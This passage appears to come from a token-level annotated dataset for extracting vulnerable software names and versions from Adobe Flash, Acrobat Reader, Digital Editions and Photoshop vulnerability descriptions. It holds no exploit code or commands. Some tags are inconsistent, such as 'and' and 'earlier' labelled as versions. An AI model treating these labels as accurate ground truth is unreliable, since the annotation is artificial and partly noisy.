earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
MakeAccessible O O
plugin O O
when O O
parsing O O
TrueType O O
font O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
26.0.0.131 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
Action O O
Script O O
2 O O
BitmapData O O
class O O
. O O

Successful O O
exploitation O O
could O O
lead O O
to O O
memory O O
address O O
disclosure O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
26.0.0.131 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
Action S-vulnerable_software pair_1
Script S-vulnerable_software pair_1
3 S-vulnerable_version pair_1
raster O O
data O O
model O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
versions O O
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
character O O
code O O
mapping O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
versions O O
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
PDF O O
parsing O O
engine O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
versions O O
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
PDF O O
processing O O
engine O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
versions O O
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
bitmap O O
representation O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
versions S-vulnerable_version pair_0
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
versions O O
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
PDF O O
imaging O O
model O O
. O O

Adobe S-vulnerable_software pair_0
Digital S-vulnerable_software pair_0
Editions S-vulnerable_software pair_0
versions O O
4.5.4 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
PDF O O
runtime O O
engine O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.171 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
LocaleID O O
class O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.171 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
internal O O
representation O O
of O O
raster O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.171 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Adobe O O
Texture O O
Format O O
( O O
ATF O O
) O O
module O O
. O O

Adobe O O
Flash O O
- O O
ATF O O
Parser O O
Heap O O
Corruption O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.171 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
PNG O O
image O O
parser O O
. O O

Adobe O O
Flash O O
- O O
Image O O
Decoding O O
Out-of-Bounds O O
Read O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.148 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Graphics O O
class O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.148 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
use O O
after O O
free O O
vulnerability O O
when O O
handling O O
multiple O O
mask O O
properties O O
of O O
display O O
objects O O
, O O
aka O O
memory O O
corruption O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.148 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
BitmapData O O
class O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.148 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
ConvolutionFilter O O
class O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.148 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
BlendMode O O
class O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.148 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Advanced O O
Video O O
Coding O O
engine O O
. O O

Adobe O O
Flash O O
- O O
AVC O O
Deblocking O O
Out-of-Bounds O O
Read O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
font O O
manipulation O O
functionality O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.127 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
parsing O O
a O O
shape O O
outline O O
. O O

Source O O
: O O
attached O O
swf O O
causes O O
an O O
out-of-bounds O O
read O O
in O O
getting O O
the O O
width O O
of O O
a O O
TextField O O
. O O

Adobe O O
Flash O O
- O O
Out-of-Bounds O O
Read O O
in O O
Getting O O
TextField O O
Width O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
25.0.0.127 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
SWF O O
parser O O
. O O

Adobe O O
Flash O O
- O O
Margin O O
Handling O O
Heap O O
Corruption O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
JavaScript O O
engine O O
, O O
related O O
to O O
string O O
manipulation O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
, O O
related O O
to O O
manipulation O O
of O O
EMF O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
, O O
related O O
to O O
parsing O O
of O O
JPEG O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
, O O
related O O
to O O
parsing O O
of O O
GIF O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JPEG O O
2000 O O
engine O O
, O O
related O O
to O O
image O O
scaling O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
parsing O O
font O O
data O O
in O O
MakeAccessible O O
plugin O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JBIG2 O O
image O O
compression O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
PPKLite O O
security O O
handler O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
parsing O O
TTF O O
( O O
TrueType O O
font O O
format O O
) O O
stream O O
data O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JavaScript O O
engine O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
related O O
to O O
processing O O
of O O
the O O
PCX O O
( O O
picture O O
exchange O O
) O O
file O O
format O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
AES O O
module O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
module O O
, O O
related O O
to O O
processing O O
of O O
TIFF O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
related O O
to O O
internal O O
object O O
representation O O
manipulation O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
manipulating O O
PDF O O
annotations O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JPEG O O
2000 O O
code-stream O O
tile O O
functionality O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Product O O
Representation O O
Compact O O
( O O
PRC O O
) O O
format O O
parser O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
renderer O O
functionality O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
handling O O
a O O
malformed O O
PDF O O
file O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
2017.009.20058 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2017.008.30051 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
2015.006.30306 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
and S-vulnerable_version pair_0
11.0.20 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
has O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
11.0.19 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30280 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.023.20070 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
JBIG2 O O
parsing O O
functionality O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
rendering O O
engine O O
. O O

Adobe S-vulnerable_software pair_0
Photoshop S-vulnerable_software pair_0
versions O O
CC S-vulnerable_version pair_0
2017 S-vulnerable_version pair_0
( O O
18.0.1 S-vulnerable_version pair_0
) O O
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
CC S-vulnerable_version O
2015.5.1 S-vulnerable_version O
( O O
17.0.1 S-vulnerable_version O
) O O
and S-vulnerable_version O
earlier S-vulnerable_version O
have O O
a O O
memory O O
corruption O O
vulnerability O O
when O O
parsing O O
malicious O O
PCX O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.221 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
Primetime O O
TVSDK O O
functionality O O
related O O
to O O
hosting O O
playback O O
surface O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.221 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
Primetime O O
TVSDK O O
API O O
functionality O O
related O O
to O O
timeline O O
interactions O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.194 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
Primetime O O
SDK O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.194 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
h264 O O
codec O O
( O O
related O O
to O O
decompression O O
) O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.194 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
h264 O O
decompression O O
routine O O
. O O

Adobe S-vulnerable_software pair_0
Flash S-vulnerable_software pair_0
Player S-vulnerable_software pair_0
versions O O
24.0.0.194 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
performing O O
garbage O O
collection O O
. O O

Adobe O O
Flash O O
- O O
SWF O O
Stack O O
Corruption O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
the O O
image O O
conversion O O
related O O
to O O
JPEG O O
parsing O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
XFA O O
engine O O
related O O
to O O
a O O
form O O
structure O O
and O O
organization O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
, O O
related O O
to O O
TIFF O O
file O O
parsing O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
, O O
related O O
to O O
handling O O
of O O
the O O
color O O
profile O O
in O O
a O O
TIFF O O
file O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
engine O O
, O O
related O O
to O O
parsing O O
of O O
EXIF O O
metadata O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
in O O
image O O
conversion O O
when O O
processing O O
a O O
TIFF O O
image O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
parsing O O
crafted O O
TIFF O O
image O O
files O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
15.006.30244 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
, O O
11.0.18 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
earlier S-vulnerable_version pair_0
have O O
an O O
exploitable O O
memory O O
corruption O O
vulnerability O O
when O O
processing O O
tags O O
in O O
TIFF O O
images O O
. O O

Adobe S-vulnerable_software pair_0
Acrobat S-vulnerable_software pair_0
Reader S-vulnerable_software pair_0
versions O O
15.020.20042 S-vulnerable_version pair_0
and S-vulnerable_version pair_0
